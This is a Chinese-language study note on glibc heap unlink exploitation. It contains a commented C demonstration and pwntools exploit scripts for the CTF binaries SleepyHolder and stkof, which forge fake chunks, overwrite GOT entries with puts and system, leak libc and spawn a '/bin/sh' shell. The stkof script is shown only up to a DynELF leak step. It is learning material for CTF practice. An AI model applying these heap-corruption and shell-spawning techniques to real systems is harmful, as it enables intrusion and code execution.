疑问：

1、p到底是堆块开头的地址还是用户数据开头的地址？（即是prev_size处还是fd处）

2、到底是如何绕过检测的？正常情况下，Fd=p->fd，FD应该等于p->fd处存放的地址（BK同），那么FD->bk处也是存放着一个地址，这个地址就是p的地址（BK->fd同）。但是按照教程中的绕过方法，FD->bk处就是p处，存放的是prev_size而不是p的地址（BK->fd同）。

解答2：

教程中没有写清楚，应该是：

fd = &ptr - 0x18
bk = &ptr - 0x10

其中ptr存放p的地址

解答1：

在chunk的用户数据处构造了一个fake chunk，p既是chunk用户数据的开头地址，也是fake chunk的堆块开头地址

自己写的讲解

网上的教程讲的不够清楚（至少对于我来说是这样），how2heap中的程序讲的比较清晰。

这里以网上的一个教程中的程序为例，自己来分析一遍

#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>

int main(){
    int malloc_size = 0x80;
    uint64_t* ptr0 = (uint64_t*)malloc(malloc_size);
    uint64_t* ptr1 = (uint64_t*)malloc(malloc_size);
    //这里申请了两个堆块，并且声明了两个指针分别指向它们
    //注意，这两个指针本身位于栈上，而存储的内容则是堆上的地址——分别指向两个堆块的数据段
    ptr0[2] = (uint64_t)&ptr0 - 3*sizeof(uint64_t);
    ptr0[3] = (uint64_t)&ptr0 - 2*sizeof(uint64_t);
    //在堆块0中构造一个fake chunk，给这个fake chunk的fd和bk分别赋值为&ptr0-3和&ptr0-2
    //注意，这里的&ptr0-3和&ptr0-2都是栈上的地址
    //在进行检验时，p->fd地址为ptr0[2]，存储的值为&ptr0-3
    //p->fd->bk地址为&ptr0-3+3，即&ptr0
    //ptr0中存储的值为堆块0的数据段首地址，同时也是fake chunk的首地址，因此p->bk->fd==p成立

    uint64_t* ptr1_head = (uint64_t)ptr1 - 2*sizeof(uint64_t);
    ptr1_head[0] = malloc_size;
    ptr1_head[1] &= ~1;
    //伪造堆块1的head，使prev_size为fake chunk的大小，size的P位为0
    free(ptr1);
    //触发unlink，unlink的过程如下：
    //FD = p->fd;
    //BK = p->bk;
    //FD->bk = BK;
    //BK->fd = FD;
    //最终导致的结果为ptr0中存储的内容由堆块0的数据段首地址（也是fake chunk首地址）变为了&ptr0-3
    //也就是说，我们再通过ptr0进行写入时，不是写入到堆块0的数据段中，而是写入到栈上&ptr0-3的位置
    char victim[10] = "hello";
    ptr0[3]=(uint64_t)victim;
    ptr0[0] = 0x4141414141;
    //ptr0[3]，正好是ptr0的位置，将其覆盖为字符串victim的首地址
    //再次对其进行写入，ptr0[0]正好是字符串victim的第一位，所以相当于对字符串victim进行写入
    printf("%s\n",victim);
    return 0;

}

unlink攻击

unlink漏洞可以造成任意地址写

前提是能够覆盖到下一个chunk的头（即prev_size和size）

#!/usr/bin/env python
from pwn import *

#r = remote('52.68.31.117', 9547)
r = process('./SleepyHolder')
def add(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('1')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

def de(t):
    r.recvuntil('3. Renew secret\n')
    r.sendline('2')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))

def update(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('3')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

add(1, 'a')
add(2, 'a')
de(1)
add(3, 'a')
de(1)
#构造double free，small_secret在fastbin和smallbin中各有一个

f_ptr = 0x6020d0
fake_chunk = p64(0) + p64(0x21)
fake_chunk += p64(f_ptr - 0x18) + p64(f_ptr-0x10)
fake_chunk += '\x20'
add(1, fake_chunk)
de(2)
#unlink攻击，原本存储small_secret的地址的地方（0x6020d0）现在存储0x6020b8

atoi_GOT = 0x602080
free_GOT = 0x602018
puts_GOT = 0x602020
puts_plt = 0x400760
atoi_offset = 0x36e70
system_offset = 0x45380

f = p64(0)
f += p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT)
f += p32(1)*3
update(1, f)
#原本存储big_secret地址处改为atoi的got地址
#原本存储huge_secret地址处改为puts的got地址
#原本存储small_secret地址处改为free的got地址
update(1, p64(puts_plt))
#free的got地址处改为puts的plt地址
de(2)
#free变成了puts，所有效果是输出big_secret处存储的atoi的got地址
s = r.recv(6)
libc_base = u64(s.ljust(8, '\x00')) - atoi_offset
system = libc_base + system_offset
update(1, p64(system))
#free的got地址处改为system的libc地址
add(2, 'sh\0')
de(2)

from pwn import *
#context.log_level = 'debug'

p = process('./stkof')

e = ELF('./stkof')
libc = ELF('./libc.so.6')

ptr = 0x602140
ptr2 = ptr + 0x10

def add(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')

def write(index,con):
    p.sendline('2')
    p.sendline(str(index))
    p.sendline(str(len(con)))
    p.send(con)
    p.recvuntil('OK\n')

def free(index):
    p.sendline('3')
    p.sendline(str(index))

def leak(addr):
    payload = p64(1)*2 + p64(addr)
    write(2,payload)
    free(1)
    #print(addr)
    data = p.recvuntil('OK\n')
    data = data.split('\x0aOK')[0]
    #print(data)
    if data == '':
        return '\x00'
    return data

add(0x80)#1
add(0x80)#2
add(0x80)#3
add(0x80)#4
payload = p64(0) + p64(0x81) + p64(ptr2-0x18) + p64(ptr2-0x10) + 'a'*0x60 + p64(0x80) + p64(0x90)
write(2,payload)
free(3)
p.recvuntil('OK\n')

free_got = 0x602018
puts_plt = 0x400760

payload = p64(1)*2 + p64(free_got)
write(2,payload)
payload = p64(puts_plt)
write(1,payload)
#print('start\n')
d = DynELF(leak,elf=e)

大致梳理一下思路：

这个程序主要有4个功能：

1：创建新的堆块（设置长度）

2：向已有堆块中写入（没有长度限制）

3：free已有堆块（会把指针清空）

4：判断长度是否>3（没什么用）

因为向堆块的写入没有长度限制，所以我们可以覆盖到下个堆块的头，从而利用unlink漏洞造成任意地址写

让一个堆块的指针指向free函数的got地址，如何改写这个堆块的内容，实际上就改写了free函数指向的内容，可以将其改为其他函数的plt地址

由于没有提供libc文件，所以需要用DynELF进行泄漏，这里需要先将puts函数的plt地址写到free_got处，再将addr覆盖至某个堆块的指针，然后将其free（实际上是puts）

泄露出libc之后将system函数的plt地址写到free_got处，再将’/bin/sh’写入某个堆块，最后将其free，就可以达到system(‘/bin/sh’)

所有堆块的指针放在一个数组中，利用哪一个进行unlink其实没有太大关系，但是关系到后面构造payload时的复杂度
